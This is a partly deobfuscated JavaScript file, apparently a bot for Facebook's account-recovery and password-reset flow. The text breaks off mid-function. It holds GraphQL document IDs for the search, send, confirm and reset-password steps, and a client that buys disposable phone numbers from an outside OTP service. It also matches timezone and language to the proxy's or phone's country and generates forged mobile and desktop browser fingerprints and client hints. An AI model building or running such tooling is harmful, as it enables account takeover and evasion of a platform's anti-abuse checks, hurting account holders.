const fs = require('fs'),
  path = require("path"),
  http = require("http"),
  https = require("https"),
  crypto = require("crypto"),
  zlib = require("zlib"),
  readline = require("readline"),
  net = require("net"),
  tls = require("tls");
let chalk;
try {
  chalk = require("chalk");
} catch (v43) {
  const id = v45 => v45,
    v44 = {};
  v44.hex = () => id, v44.white = id, v44.gray = id, v44.green = id, v44.red = id, v44.yellow = id, v44.cyan = id, v44.greenBright = id, v44.redBright = id, v44.bold = id, chalk = v44, chalk.hex = () => id, chalk.white.bold = id;
}
const B = chalk.hex("#4267B2"),
  C = chalk.hex("#1877F2"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B"),
  DIM = chalk.hex("#555555"),
  FB_CYAN = C,
  FB_GOLD = Y,
  FB_EMERALD = chalk.hex("#00FF88").bold,
  FB_AMBER = chalk.hex("#FF9900").bold,
  FB_PURPLE = chalk.hex("#A855F7").bold,
  FB_MUTED = DIM;
const DOC_SEARCH = "26328147246854413",
  DOC_SELECT = "9730637087034984",
  DOC_INITIATE = "34997761669869656",
  DOC_SEND = "25714184854871712",
  DOC_CONFIRM = "25167079949661220",
  DOC_RESET_PWD = "25720433727646438",
  uuid = () => crypto.randomUUID(),
  FB_HOST = "www.facebook.com";
const sleep = v46 => new Promise(v47 => setTimeout(v47, v46));
let SELECTED_BROWSER = "random";
class NexaRateLimiter {
  constructor(v48) {
    this.delayMs = v48, this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v49) {
    return new Promise((v50, v51) => {
      this.queue.push(async () => {
        try {
          v50(await v49());
        } catch (v52) {
          v51(v52);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      {
        const v53 = this.queue.shift();
        await v53(), await new Promise(v54 => setTimeout(v54, this.delayMs));
      }
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v55, v56, v57) {
  return new Promise((v58, v59) => {
    {
      const v60 = {};
      v60.range = v56, v60.format = "normal";
      const v61 = JSON.stringify(v60),
        v62 = {
          'hostname': "nexaotpservice.com",
          'port': 0x1bb,
          'path': v57 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v55,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v61)
          }
        },
        v63 = https.request(v62, v64 => {
          {
            let v65 = '';
            v64.on("data", v66 => v65 += v66), v64.on("end", () => {
              try {
                const v67 = JSON.parse(v65);
                v67.success && v67.number ? v58(v67.number.replace(/[^0-9]/g, '')) : v59(new Error(v67.error || "NexaOTP: No number returned"));
              } catch (v68) {
                v59(new Error("NexaOTP: Invalid response"));
              }
            });
          }
        });
      v63.on("error", v69 => v59(new Error("NexaOTP network: " + v69.message))), v63.setTimeout(10000, () => {
        v63.destroy(), v59(new Error("NexaOTP: Timeout"));
      }), v63.write(v61), v63.end();
    }
  });
}
let dataBytesTotal = 0;
function trackBytes(v70) {
  dataBytesTotal += v70;
}
function dataMB() {
  return (dataBytesTotal / 1024 / 1024).toFixed(2);
}
const DEBUG_LOG = false,
  DEBUG_TXT_FILE = require("path").join(__dirname, "debug.txt"),
  CONFIRM_DEBUG_FILE = require("path").join(__dirname, "confirm_debug.txt");
function dbg(v71) {
  if (!DEBUG_LOG) return;
  if (process.argv.includes("--debug")) {
    const v72 = '[' + new Date().toISOString() + ']\x20' + v71 + '\x0a';
    try {
      process.stdout.write(v72);
    } catch (v73) {}
  }
}
function cdbg(v74) {
  if (!DEBUG_LOG) return;
  if (process.argv.includes("--debug")) {
    {
      const v75 = '[' + new Date().toISOString() + ']\x20' + v74 + '\x0a';
      try {
        process.stdout.write(v75);
      } catch (v76) {}
    }
  }
}
const v1 = {};
v1.US = "en-US,en;q=0.9", v1.CA = "en-CA,en;q=0.9,fr-CA;q=0.8", v1.MX = "es-MX,es;q=0.9,en;q=0.8", v1.BR = "pt-BR,pt;q=0.9,en;q=0.8", v1.AR = "es-AR,es;q=0.9,en;q=0.8", v1.CO = "es-CO,es;q=0.9", v1.CL = "es-CL,es;q=0.9", v1.PE = "es-PE,es;q=0.9", v1.VE = "es-VE,es;q=0.9", v1.EC = "es-EC,es;q=0.9", v1.BO = "es-BO,es;q=0.9", v1.PY = "es-PY,es;q=0.9", v1.UY = "es-UY,es;q=0.9", v1.CU = "es-CU,es;q=0.9", v1.DO = "es-DO,es;q=0.9", v1.GT = "es-GT,es;q=0.9", v1.HN = "es-HN,es;q=0.9", v1.SV = "es-SV,es;q=0.9", v1.NI = "es-NI,es;q=0.9", v1.CR = "es-CR,es;q=0.9", v1.PA = "es-PA,es;q=0.9", v1.JM = "en-JM,en;q=0.9", v1.TT = "en-TT,en;q=0.9", v1.BB = "en-BB,en;q=0.9", v1.GY = "en-GY,en;q=0.9", v1.SR = "nl-SR,nl;q=0.9,en;q=0.8", v1.HT = "fr-HT,fr;q=0.9,ht;q=0.8", v1.PR = "es-PR,es;q=0.9,en;q=0.8", v1.BZ = "en-BZ,en;q=0.9", v1.GB = "en-GB,en;q=0.9", v1.IE = "en-IE,en;q=0.9", v1.FR = "fr-FR,fr;q=0.9,en;q=0.8", v1.DE = "de-DE,de;q=0.9,en;q=0.8", v1.ES = "es-ES,es;q=0.9,en;q=0.8", v1.IT = "it-IT,it;q=0.9,en;q=0.8", v1.PT = "pt-PT,pt;q=0.9,en;q=0.8", v1.NL = "nl-NL,nl;q=0.9,en;q=0.8", v1.BE = "nl-BE,nl;q=0.9,fr-BE;q=0.8", v1.CH = "de-CH,de;q=0.9,fr-CH;q=0.8,it-CH;q=0.7", v1.AT = "de-AT,de;q=0.9", v1.LU = "fr-LU,fr;q=0.9", v1.SE = "sv-SE,sv;q=0.9,en;q=0.8", v1.NO = "nb-NO,nb;q=0.9,en;q=0.8", v1.DK = "da-DK,da;q=0.9,en;q=0.8", v1.FI = "fi-FI,fi;q=0.9,en;q=0.8", v1.IS = "is-IS,is;q=0.9,en;q=0.8", v1.PL = "pl-PL,pl;q=0.9,en;q=0.8", v1.CZ = "cs-CZ,cs;q=0.9,en;q=0.8", v1.SK = "sk-SK,sk;q=0.9,en;q=0.8", v1.HU = "hu-HU,hu;q=0.9,en;q=0.8", v1.RO = "ro-RO,ro;q=0.9,en;q=0.8", v1.BG = "bg-BG,bg;q=0.9,en;q=0.8", v1.HR = "hr-HR,hr;q=0.9,en;q=0.8", v1.SI = "sl-SI,sl;q=0.9,en;q=0.8", v1.BA = "bs-BA,bs;q=0.9,hr;q=0.8", v1.RS = "sr-RS,sr;q=0.9,en;q=0.8", v1.AL = "sq-AL,sq;q=0.9,en;q=0.8", v1.MK = "mk-MK,mk;q=0.9,en;q=0.8", v1.GR = "el-GR,el;q=0.9,en;q=0.8", v1.CY = "el-CY,el;q=0.9,en;q=0.8", v1.TR = "tr-TR,tr;q=0.9,en;q=0.8", v1.RU = "ru-RU,ru;q=0.9,en;q=0.8", v1.UA = "uk-UA,uk;q=0.9,ru;q=0.8", v1.BY = "be-BY,be;q=0.9,ru;q=0.8", v1.MD = "ro-MD,ro;q=0.9,ru;q=0.8", v1.LT = "lt-LT,lt;q=0.9,en;q=0.8", v1.LV = "lv-LV,lv;q=0.9,en;q=0.8", v1.EE = "et-EE,et;q=0.9,en;q=0.8", v1.AM = "hy-AM,hy;q=0.9,en;q=0.8", v1.GE = "ka-GE,ka;q=0.9,en;q=0.8", v1.AZ = "az-AZ,az;q=0.9,en;q=0.8", v1.KZ = "kk-KZ,kk;q=0.9,ru;q=0.8", v1.MT = "mt-MT,mt;q=0.9,en;q=0.8", v1.ME = "sr-ME,sr;q=0.9", v1.XK = "sq-XK,sq;q=0.9", v1.LI = "de-LI,de;q=0.9", v1.MC = "fr-MC,fr;q=0.9", v1.SM = "it-SM,it;q=0.9", v1.VA = "it-VA,it;q=0.9", v1.AD = "ca-AD,ca;q=0.9,es;q=0.8", v1.SA = "ar-SA,ar;q=0.9,en;q=0.8", v1.AE = "ar-AE,ar;q=0.9,en;q=0.8", v1.QA = "ar-QA,ar;q=0.9,en;q=0.8", v1.KW = "ar-KW,ar;q=0.9,en;q=0.8", v1.BH = "ar-BH,ar;q=0.9,en;q=0.8", v1.OM = "ar-OM,ar;q=0.9,en;q=0.8", v1.YE = "ar-YE,ar;q=0.9", v1.IQ = "ar-IQ,ar;q=0.9", v1.SY = "ar-SY,ar;q=0.9", v1.JO = "ar-JO,ar;q=0.9,en;q=0.8", v1.LB = "ar-LB,ar;q=0.9,fr;q=0.8", v1.IL = "he-IL,he;q=0.9,en;q=0.8", v1.IR = "fa-IR,fa;q=0.9,en;q=0.8", v1.PS = "ar-PS,ar;q=0.9", v1.IN = "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7", v1.PK = "ur-PK,ur;q=0.9,en;q=0.8", v1.BD = "bn-BD,bn;q=0.9,en;q=0.8", v1.LK = "si-LK,si;q=0.9,en;q=0.8", v1.NP = "ne-NP,ne;q=0.9,en;q=0.8", v1.CN = "zh-CN,zh;q=0.9,en;q=0.8", v1.TW = "zh-TW,zh;q=0.9,en;q=0.8", v1.HK = "zh-HK,zh;q=0.9,en;q=0.8", v1.JP = "ja-JP,ja;q=0.9,en;q=0.8", v1.KR = "ko-KR,ko;q=0.9,en;q=0.8", v1.VN = "vi-VN,vi;q=0.9,en;q=0.8", v1.TH = "th-TH,th;q=0.9,en;q=0.8", v1.MY = "ms-MY,ms;q=0.9,en;q=0.8", v1.SG = "en-SG,en;q=0.9,zh;q=0.8", v1.ID = "id-ID,id;q=0.9,en;q=0.8", v1.PH = "fil-PH,fil;q=0.9,en;q=0.8", v1.MM = "my-MM,my;q=0.9,en;q=0.8", v1.KH = "km-KH,km;q=0.9,en;q=0.8", v1.LA = "lo-LA,lo;q=0.9,en;q=0.8", v1.MN = "mn-MN,mn;q=0.9", v1.AF = "ps-AF,ps;q=0.9,fa;q=0.8", v1.BT = "dz-BT,dz;q=0.9,en;q=0.8", v1.MV = "dv-MV,dv;q=0.9,en;q=0.8", v1.TL = "pt-TL,pt;q=0.9,en;q=0.8", v1.PG = "en-PG,en;q=0.9", v1.FJ = "en-FJ,en;q=0.9", v1.AU = "en-AU,en;q=0.9", v1.NZ = "en-NZ,en;q=0.9", v1.UZ = "uz-UZ,uz;q=0.9,ru;q=0.8", v1.TM = "tk-TM,tk;q=0.9,ru;q=0.8", v1.TJ = "tg-TJ,tg;q=0.9,ru;q=0.8", v1.KG = "ky-KG,ky;q=0.9,ru;q=0.8", v1.NG = "en-NG,en;q=0.9", v1.GH = "en-GH,en;q=0.9", v1.KE = "sw-KE,sw;q=0.9,en;q=0.8", v1.TZ = "sw-TZ,sw;q=0.9,en;q=0.8";
v1.UG = "en-UG,en;q=0.9", v1.ZA = "en-ZA,en;q=0.9,af;q=0.8", v1.ET = "am-ET,am;q=0.9,en;q=0.8", v1.EG = "ar-EG,ar;q=0.9,en;q=0.8", v1.DZ = "ar-DZ,ar;q=0.9,fr;q=0.8", v1.MA = "ar-MA,ar;q=0.9,fr;q=0.8", v1.TN = "ar-TN,ar;q=0.9,fr;q=0.8", v1.LY = "ar-LY,ar;q=0.9", v1.SD = "ar-SD,ar;q=0.9", v1.SO = "so-SO,so;q=0.9,ar;q=0.8", v1.CM = "fr-CM,fr;q=0.9,en;q=0.8", v1.CI = "fr-CI,fr;q=0.9", v1.SN = "fr-SN,fr;q=0.9", v1.ML = "fr-ML,fr;q=0.9", v1.BF = "fr-BF,fr;q=0.9", v1.GN = "fr-GN,fr;q=0.9", v1.NE = "fr-NE,fr;q=0.9", v1.TD = "fr-TD,fr;q=0.9,ar;q=0.8", v1.CF = "fr-CF,fr;q=0.9", v1.CD = "fr-CD,fr;q=0.9", v1.CG = "fr-CG,fr;q=0.9", v1.GA = "fr-GA,fr;q=0.9", v1.GQ = "es-GQ,es;q=0.9,fr;q=0.8", v1.ST = "pt-ST,pt;q=0.9", v1.AO = "pt-AO,pt;q=0.9", v1.MZ = "pt-MZ,pt;q=0.9", v1.ZM = "en-ZM,en;q=0.9", v1.ZW = "en-ZW,en;q=0.9", v1.MW = "en-MW,en;q=0.9", v1.NA = "en-NA,en;q=0.9,af;q=0.8", v1.BW = "en-BW,en;q=0.9", v1.LS = "en-LS,en;q=0.9", v1.SZ = "en-SZ,en;q=0.9", v1.RW = "rw-RW,rw;q=0.9,fr;q=0.8,en;q=0.7", v1.BI = "fr-BI,fr;q=0.9", v1.MG = "mg-MG,mg;q=0.9,fr;q=0.8", v1.KM = "ar-KM,ar;q=0.9,fr;q=0.8", v1.MU = "en-MU,en;q=0.9,fr;q=0.8", v1.SC = "fr-SC,fr;q=0.9,en;q=0.8", v1.DJ = "fr-DJ,fr;q=0.9,ar;q=0.8", v1.ER = "ti-ER,ti;q=0.9,ar;q=0.8", v1.GW = "pt-GW,pt;q=0.9", v1.CV = "pt-CV,pt;q=0.9", v1.SL = "en-SL,en;q=0.9", v1.LR = "en-LR,en;q=0.9", v1.TG = "fr-TG,fr;q=0.9", v1.BJ = "fr-BJ,fr;q=0.9", v1.GM = "en-GM,en;q=0.9", v1.PW = "en-PW,en;q=0.9", v1.FM = "en-FM,en;q=0.9", v1.MH = "en-MH,en;q=0.9", v1.NR = "en-NR,en;q=0.9", v1.KI = "en-KI,en;q=0.9", v1.TV = "en-TV,en;q=0.9", v1.TO = "en-TO,en;q=0.9", v1.WS = "en-WS,en;q=0.9", v1.VU = "bi-VU,bi;q=0.9,fr;q=0.8,en;q=0.7", v1.SB = "en-SB,en;q=0.9";
const COUNTRY_LANG_MAP = v1;
function getPhoneLang(v77) {
  const v78 = detectCountry(v77);
  if (v78 && COUNTRY_LANG_MAP[v78]) return COUNTRY_LANG_MAP[v78];
  return "en-US,en;q=0.9";
}
const v2 = {};
v2['1'] = 'US', v2['20'] = 'EG', v2['27'] = 'ZA', v2['30'] = 'GR', v2['31'] = 'NL', v2['32'] = 'BE', v2['33'] = 'FR', v2['34'] = 'ES', v2['36'] = 'HU', v2['39'] = 'IT', v2['40'] = 'RO', v2['41'] = 'CH', v2['43'] = 'AT', v2['44'] = 'GB', v2['45'] = 'DK', v2['46'] = 'SE', v2['47'] = 'NO', v2['48'] = 'PL', v2['49'] = 'DE', v2['51'] = 'PE', v2['52'] = 'MX', v2['53'] = 'CU', v2['54'] = 'AR', v2['55'] = 'BR', v2['56'] = 'CL', v2['57'] = 'CO', v2['58'] = 'VE', v2['60'] = 'MY', v2['61'] = 'AU', v2['62'] = 'ID', v2['63'] = 'PH', v2['64'] = 'NZ', v2['65'] = 'SG', v2['66'] = 'TH', v2['81'] = 'JP', v2['82'] = 'KR', v2['84'] = 'VN', v2['86'] = 'CN', v2['90'] = 'TR', v2['91'] = 'IN', v2['92'] = 'PK', v2['93'] = 'AF', v2['94'] = 'LK', v2['95'] = 'MM', v2['98'] = 'IR', v2["212"] = 'MA', v2["213"] = 'DZ', v2["216"] = 'TN', v2["218"] = 'LY', v2["220"] = 'GM', v2["221"] = 'SN', v2["223"] = 'ML', v2["224"] = 'GN', v2["225"] = 'CI', v2["226"] = 'BF', v2["227"] = 'NE', v2["228"] = 'TG', v2["229"] = 'BJ', v2["230"] = 'MU', v2["231"] = 'LR', v2["232"] = 'SL', v2["233"] = 'GH', v2["234"] = 'NG', v2["235"] = 'TD', v2["236"] = 'CF', v2["237"] = 'CM', v2["240"] = 'GQ', v2["241"] = 'GA', v2["242"] = 'CG', v2["243"] = 'CD', v2["244"] = 'AO', v2["248"] = 'SC', v2["249"] = 'SD', v2["250"] = 'RW', v2["251"] = 'ET', v2["252"] = 'SO', v2["254"] = 'KE', v2["255"] = 'TZ', v2["256"] = 'UG', v2["257"] = 'BI', v2["258"] = 'MZ', v2["260"] = 'ZM', v2["261"] = 'MG', v2["263"] = 'ZW', v2["264"] = 'NA', v2["265"] = 'MW', v2["351"] = 'PT', v2["352"] = 'LU', v2["353"] = 'IE', v2["354"] = 'IS', v2["355"] = 'AL', v2["358"] = 'FI', v2["359"] = 'BG', v2["370"] = 'LT', v2["371"] = 'LV', v2["372"] = 'EE', v2["373"] = 'MD', v2["374"] = 'AM', v2["375"] = 'BY', v2["380"] = 'UA', v2["381"] = 'RS', v2["385"] = 'HR', v2["386"] = 'SI', v2["387"] = 'BA', v2["420"] = 'CZ', v2["421"] = 'SK', v2["591"] = 'BO', v2["593"] = 'EC', v2["595"] = 'PY', v2["598"] = 'UY', v2["852"] = 'HK', v2["855"] = 'KH', v2["856"] = 'LA', v2["880"] = 'BD', v2["886"] = 'TW', v2["960"] = 'MV', v2["961"] = 'LB', v2["962"] = 'JO', v2["963"] = 'SY', v2["964"] = 'IQ', v2["965"] = 'KW';
v2["966"] = 'SA', v2["967"] = 'YE', v2["968"] = 'OM', v2["971"] = 'AE', v2["972"] = 'IL', v2["973"] = 'BH', v2["974"] = 'QA', v2["975"] = 'BT', v2["976"] = 'MN', v2["977"] = 'NP', v2["992"] = 'TJ', v2["994"] = 'AZ', v2["995"] = 'GE', v2["996"] = 'KG', v2["998"] = 'UZ', v2['7'] = 'RU';
const COUNTRY_CODES = v2;
function detectCountry(v79) {
  const v80 = v79.replace(/^\+/, '');
  for (let v81 = 4; v81 >= 1; v81--) {
    const v82 = COUNTRY_CODES[v80.substring(0, v81)];
    if (v82) return v82;
  }
  return null;
}
const v3 = {};
v3.US = -300, v3.CA = -300, v3.MX = -360, v3.BR = -180, v3.AR = -180, v3.CL = -240, v3.CO = -300, v3.PE = -300, v3.VE = -240, v3.EC = -300, v3.BO = -240, v3.PY = -240, v3.UY = -180, v3.CU = -300, v3.GB = 0x0, v3.IE = 0x0, v3.IS = 0x0, v3.PT = 0x0, v3.FR = 0x3c, v3.DE = 0x3c, v3.ES = 0x3c, v3.IT = 0x3c, v3.NL = 0x3c, v3.BE = 0x3c, v3.AT = 0x3c, v3.CH = 0x3c, v3.DK = 0x3c, v3.SE = 0x3c, v3.NO = 0x3c, v3.PL = 0x3c, v3.CZ = 0x3c, v3.SK = 0x3c, v3.HU = 0x3c, v3.HR = 0x3c, v3.SI = 0x3c, v3.BA = 0x3c, v3.RS = 0x3c, v3.AL = 0x3c, v3.LU = 0x3c, v3.FI = 0x78, v3.RO = 0x78, v3.BG = 0x78, v3.GR = 0x78, v3.UA = 0x78, v3.MD = 0x78, v3.LT = 0x78, v3.LV = 0x78, v3.EE = 0x78, v3.EG = 0x78, v3.ZA = 0x78, v3.IL = 0x78, v3.LB = 0x78, v3.JO = 0x78, v3.SY = 0x78, v3.BY = 0xb4, v3.RU = 0xb4, v3.TR = 0xb4, v3.SA = 0xb4, v3.IQ = 0xb4, v3.KW = 0xb4, v3.BH = 0xb4, v3.QA = 0xb4, v3.YE = 0xb4, v3.KE = 0xb4, v3.ET = 0xb4, v3.TZ = 0xb4, v3.UG = 0xb4, v3.SO = 0xb4, v3.MG = 0xb4, v3.IR = 0xd2, v3.AF = 0x10e, v3.AE = 0xf0, v3.OM = 0xf0, v3.AZ = 0xf0, v3.GE = 0xf0, v3.AM = 0xf0, v3.MU = 0xf0, v3.SC = 0xf0, v3.PK = 0x12c, v3.UZ = 0x12c, v3.TJ = 0x12c, v3.TM = 0x12c, v3.MV = 0x12c, v3.KG = 0x168, v3.IN = 0x14a, v3.LK = 0x14a, v3.NP = 0x159, v3.BD = 0x168, v3.BT = 0x168, v3.KZ = 0x168, v3.MM = 0x186, v3.TH = 0x1a4, v3.VN = 0x1a4, v3.KH = 0x1a4, v3.LA = 0x1a4, v3.ID = 0x1a4, v3.MY = 0x1e0, v3.SG = 0x1e0, v3.PH = 0x1e0, v3.CN = 0x1e0, v3.HK = 0x1e0, v3.TW = 0x1e0, v3.MN = 0x1e0;
v3.BN = 0x1e0, v3.JP = 0x21c, v3.KR = 0x21c, v3.AU = 0x258, v3.NZ = 0x2d0, v3.GH = 0x0, v3.NG = 0x3c, v3.CM = 0x3c, v3.CD = 0x3c, v3.CG = 0x3c, v3.GA = 0x3c, v3.CI = 0x0, v3.SN = 0x0, v3.ML = 0x0, v3.GN = 0x0, v3.BF = 0x0, v3.NE = 0x3c, v3.TG = 0x0, v3.BJ = 0x3c, v3.LR = 0x0, v3.SL = 0x0, v3.TD = 0x3c, v3.CF = 0x3c, v3.GQ = 0x3c, v3.AO = 0x3c, v3.RW = 0x78, v3.BI = 0x78, v3.MZ = 0x78, v3.ZM = 0x78, v3.ZW = 0x78, v3.NA = 0x78, v3.MW = 0x78, v3.SD = 0x78, v3.DZ = 0x3c, v3.TN = 0x3c, v3.LY = 0x78, v3.MA = 0x3c, v3.GM = 0x0;
const COUNTRY_TIMEZONE_OFFSETS = v3;
function extractProxyCountry(v83) {
  if (!v83 || !v83.user) return null;
  const v84 = v83.user.match(/[_-]zone[_-]([A-Za-z]{2})/i);
  if (v84) return v84[1].toUpperCase();
  const v85 = v83.user.match(/[_-]country[_-]([A-Za-z]{2})/i);
  if (v85) return v85[1].toUpperCase();
  const v86 = v83.user.match(/[_-]cc[_-]([A-Za-z]{2})/i);
  if (v86) return v86[1].toUpperCase();
  return null;
}
function getTimezoneOffset(v87) {
  if (!v87) return -480;
  const v88 = COUNTRY_TIMEZONE_OFFSETS[v87.toUpperCase()];
  return v88 !== undefined ? v88 : 0;
}
function resolveTimezone(v89, v90) {
  const v91 = extractProxyCountry(v89);
  if (v91) return dbg("TIMEZONE: Resolved from proxy _zone_ → " + v91 + " → UTC" + (getTimezoneOffset(v91) >= 0 ? '+' : '') + getTimezoneOffset(v91) / 60 + "h (" + getTimezoneOffset(v91) + "min)"), getTimezoneOffset(v91);
  if (v90) {
    const v92 = detectCountry(v90);
    if (v92) return dbg("TIMEZONE: Resolved from phone → " + v92 + " → UTC" + (getTimezoneOffset(v92) >= 0 ? '+' : '') + getTimezoneOffset(v92) / 60 + "h (" + getTimezoneOffset(v92) + "min)"), getTimezoneOffset(v92);
  }
  return 0;
}
function randomSessionId() {
  const v93 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let v94 = '';
  for (let v95 = 0; v95 < 10; v95++) v94 += v93[Math.floor(Math.random() * v93.length)];
  return v94;
}
const v4 = {};
v4.major = 0x8a, v4.build = 0x1c24, v4.minPatch = 0x32, v4.maxPatch = 0xb4;
const v5 = {};
v5.major = 0x8b, v5.build = 0x1c5a, v5.minPatch = 0x32, v5.maxPatch = 0xb4;
const v6 = {};
v6.major = 0x8c, v6.build = 0x1c7e, v6.minPatch = 0x32, v6.maxPatch = 0xb4;
const v7 = {};
v7.major = 0x8d, v7.build = 0x1cbe, v7.minPatch = 0x32, v7.maxPatch = 0xb4;
const v8 = {};
v8.major = 0x8e, v8.build = 0x1cf3, v8.minPatch = 0x32, v8.maxPatch = 0xb4;
const v9 = {};
v9.major = 0x8f, v9.build = 0x1d2e, v9.minPatch = 0x32, v9.maxPatch = 0xb4;
const v10 = {};
v10.major = 0x90, v10.build = 0x1d66, v10.minPatch = 0x32, v10.maxPatch = 0xb4;
const v11 = {};
v11.major = 0x91, v11.build = 0x1d97, v11.minPatch = 0x32, v11.maxPatch = 0xb4;
const v12 = {};
v12.major = 0x92, v12.build = 0x1dca, v12.minPatch = 0x32, v12.maxPatch = 0xb4;
const v13 = {};
v13.major = 0x93, v13.build = 0x1dfe, v13.minPatch = 0x32, v13.maxPatch = 0xb4;
const v14 = {};
v14.major = 0x94, v14.build = 0x1e38, v14.minPatch = 0x32, v14.maxPatch = 0xb4;
const v15 = {};
v15.major = 0x95, v15.build = 0x1e73, v15.minPatch = 0x32, v15.maxPatch = 0xb4;
const v16 = {};
v16.major = 0x96, v16.build = 0x1ebf, v16.minPatch = 0x64, v16.maxPatch = 0x78;
const CHROME_VERSIONS = [v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16],
  v17 = {};
v17.ver = "24.0", v17.chrome = "149.0.7795.136";
const v18 = {};
v18.ver = "25.0", v18.chrome = "150.0.7871.114";
const v19 = {};
v19.ver = "26.0", v19.chrome = "150.0.7871.150";
const SAMSUNG_VERSIONS = [v17, v18, v19],
  v20 = {};
v20.brand = "Samsung", v20.model = "SM-S928B", v20.os = '14';
const v21 = {};
v21.brand = "Samsung", v21.model = "SM-S918B", v21.os = '14';
const v22 = {};
v22.brand = "Samsung", v22.model = "SM-G991B", v22.os = '13';
const v23 = {};
v23.brand = "Samsung", v23.model = "SM-S901B", v23.os = '13';
const v24 = {};
v24.brand = "Samsung", v24.model = "SM-S921B", v24.os = '14';
const v25 = {};
v25.brand = "Google", v25.model = "Pixel 8", v25.os = '14';
const v26 = {};
v26.brand = "Google", v26.model = "Pixel 9", v26.os = '15';
const v27 = {};
v27.brand = "Google", v27.model = "Pixel 8 Pro", v27.os = '14';
const v28 = {};
v28.brand = "OnePlus", v28.model = "IN2023", v28.os = '13';
const v29 = {};
v29.brand = "OnePlus", v29.model = "CPH2609", v29.os = '14';
const ANDROID_DEVICES = [v20, v21, v22, v23, v24, v25, v26, v27, v28, v29];
function getSamsungUserAgent() {
  const v96 = ANDROID_DEVICES.filter(v100 => v100.brand === "Samsung");
  const v97 = v96[Math.floor(Math.random() * v96.length)] || ANDROID_DEVICES[0];
  const v98 = SAMSUNG_VERSIONS[Math.floor(Math.random() * SAMSUNG_VERSIONS.length)],
    v99 = v98.chrome.split('.')[0];
  return {
    'userAgent': "Mozilla/5.0 (Linux; Android " + v97.os + ';\x20' + v97.model + ") AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/" + v98.ver + " Chrome/" + v98.chrome + " Mobile Safari/537.36",
    'browserType': "samsung",
    'isMobile': true,
    'clientHints': {
      'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Samsung Internet\";v=\"" + v98.ver.split('.')[0] + "\", \"Chromium\";v=\"" + v99 + '\x22',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-model': '\x22' + v97.model + '\x22',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-ua-platform-version': '\x22' + v97.os + ".0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDuckDuckGoUA() {
  const v101 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v102 = {};
  v102.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v101.major + ".0.0.0 Safari/537.36 DuckDuckGo/5", v102.browserType = "duckduckgo", v102.clientHints = {}, v102.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v101.major + "\", \"Not=A?Brand\";v=\"24\", \"DuckDuckGo\";v=\"5\"", v102.clientHints["sec-ch-ua-mobile"] = '?0', v102.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v102.clientHints["sec-ch-ua-platform-version"] = "\"10.0.0\"";
  return v102;
}
function getMobileUserAgent() {
  if (SELECTED_BROWSER === "samsung") return getSamsungUserAgent();
  if (SELECTED_BROWSER === "duckduckgo") return getDuckDuckGoUA();
  if (SELECTED_BROWSER === "random" && Math.random() < 0.3) return getSamsungUserAgent();
  const v103 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v104 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v105 = Math.floor(Math.random() * (v104.maxPatch - v104.minPatch + 1)) + v104.minPatch,
    v106 = v104.major + ".0." + v104.build + '.' + v105,
    v107 = {};
  v107.userAgent = "Mozilla/5.0 (Linux; Android " + v103.os + ';\x20' + v103.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v106 + " Mobile Safari/537.36", v107.browserType = "chrome", v107.isMobile = true, v107.clientHints = {}, v107.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v104.major + "\", \"Google Chrome\";v=\"" + v104.major + '\x22';
  return v107.clientHints["sec-ch-ua-full-version-list"] = "\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" + v106 + "\", \"Google Chrome\";v=\"" + v106 + '\x22', v107.clientHints["sec-ch-ua-mobile"] = '?1', v107.clientHints["sec-ch-ua-model"] = '\x22' + v103.model + '\x22', v107.clientHints["sec-ch-ua-platform"] = "\"Android\"", v107.clientHints["sec-ch-ua-platform-version"] = '\x22' + v103.os + ".0.0\"", v107.clientHints["sec-ch-prefers-color-scheme"] = "dark", v107;
}
function getDesktopChromeUA() {
  const v108 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v109 = Math.floor(Math.random() * (v108.maxPatch - v108.minPatch + 1)) + v108.minPatch;
  const v110 = v108.major + ".0." + v108.build + '.' + v109,
    v111 = {};
  v111.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v110 + " Safari/537.36", v111.browserType = "chrome", v111.isMobile = false, v111.clientHints = {};
  return v111.clientHints["sec-ch-ua"] = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v108.major + "\", \"Google Chrome\";v=\"" + v108.major + '\x22', v111.clientHints["sec-ch-ua-full-version-list"] = "\"Not;A=Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" + v110 + "\", \"Google Chrome\";v=\"" + v110 + '\x22', v111.clientHints["sec-ch-ua-mobile"] = '?0', v111.clientHints["sec-ch-ua-model"] = '\x22\x22', v111.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v111.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v111.clientHints["sec-ch-prefers-color-scheme"] = "dark", v111;
}
function getDesktopEdgeUA() {
